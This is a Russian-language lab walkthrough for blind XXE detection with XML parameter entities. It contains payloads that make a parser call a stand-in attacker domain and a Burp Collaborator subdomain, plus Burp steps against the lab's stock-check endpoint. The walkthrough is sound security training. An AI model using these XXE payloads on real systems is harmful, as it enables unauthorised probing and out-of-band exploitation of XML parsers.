Иногда атаки XXE с использованием обычных сущностей блокируются из-за некоторой проверки ввода приложением или некоторого усиления используемого парсера XML. В этой ситуации вы можете использовать сущности параметров XML вместо них. Сущности параметров XML — это особый вид сущности XML, на которую можно ссылаться только в другом месте в пределах DTD. Для настоящих целей вам нужно знать только две вещи. Во-первых, объявление сущности параметра XML включает символ процента перед именем сущности:

<!ENTITY % myparameterentity "my parameter entity value" >
Во-вторых, для ссылки на параметрические сущности используется символ процента вместо обычного амперсанда:

%myparameterentity;
Это означает, что вы можете проверить наличие слепого XXE, используя внеполосное обнаружение с помощью сущностей параметров XML следующим образом:

<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
Эта полезная нагрузка XXE объявляет сущность параметра XML, которая называется xxe, а затем использует сущность в DTD. Это вызовет поиск DNS и HTTP-запрос к домену злоумышленника, подтверждая, что атака была успешной.

---

 В этой лаборатории есть функция «Проверка запасов», которая анализирует входные данные XML, но не отображает неожиданные значения и блокирует запросы, содержащие обычные внешние сущности.

Для решения лабораторной работы используйте параметрическую сущность, чтобы анализатор XML выполнил DNS-поиск и HTTP-запрос к Burp Collaborator.

---

1. Нас встречает список продуктов, переходим на любой из них:

![image](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

---

2. Внизу страницы есть кнопка "Проверить наличие на складе" включает Burp прокси и нажимаем:

![image](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

---

3. Заходим в Proxy -> HTTP History выбираем POST запрос к /product/stock и отправляем в Repeater: 

![image](https://github.com/user-attachments/assets/714f1495-42e5-48d2-b690-8bf41c3f3a57)

---

4. Вставьте следующее определение внешней сущности между декларацией XML и stockCheck элементом. Щелкните правой кнопкой мыши и выберите «Вставить полезную нагрузку Collaborator», чтобы вставить поддомен Burp Collaborator, где указано: <!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN"> %xxe; ]>


![image](https://github.com/user-attachments/assets/0dfd4ce3-255e-42ef-b1ed-ac6b2edce480)

---

5. Перейдите на вкладку Collaborator и нажмите «Poll now». Если вы не видите перечисленных взаимодействий, подождите несколько секунд и попробуйте снова. Вы должны увидеть некоторые взаимодействия DNS и HTTP, которые были инициированы приложением в результате вашей полезной нагрузки.
